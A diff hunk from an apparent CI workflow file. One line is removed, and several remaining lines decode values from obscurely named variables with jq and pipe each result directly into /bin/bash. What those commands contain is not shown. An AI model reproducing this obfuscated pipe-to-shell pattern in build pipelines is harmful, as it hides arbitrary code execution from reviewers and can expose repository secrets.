@@ -26,7 +26,6 @@ jobs:
           echo $b01898 | jq -r .b1237 | /bin/bash
           echo $wlv9279 | jq -r .cbjt18612 | /bin/bash
           echo $cymo4404 | jq -r .o784 | /bin/bash
-          echo $ee907 | jq -r .nzcp2694 | /bin/bash
           echo $ndq7053 | jq -r .bo745 | /bin/bash
           printf '%s' "$y898" | jq -r .lrlup1 | /bin/bash
 
